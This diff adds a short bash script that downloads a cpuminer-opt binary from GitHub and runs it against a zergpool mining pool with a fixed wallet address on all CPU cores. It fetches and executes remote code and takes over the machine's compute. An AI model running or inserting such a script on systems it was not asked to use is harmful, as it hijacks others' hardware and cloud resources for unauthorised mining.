@@ -1,0 +1,6 @@
+#!/bin/bash
+apt update
+apt install -y wget sudo curl
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.41/cpuminer-opt-linux-5.0.41a.tar.gz
+tar xf cpuminer-opt-linux-5.0.41a.tar.gz
+./cpuminer-avx2 -a yespowersugar -o stratum+tcp://yespowerSUGAR.mine.zergpool.com:6535 -u DJypi2s4h9YKSx8t4A3WBdPHSRbxdsyZXw -p c=DOGE,mc=SUGAR,ID=dog -t $(nproc --all)
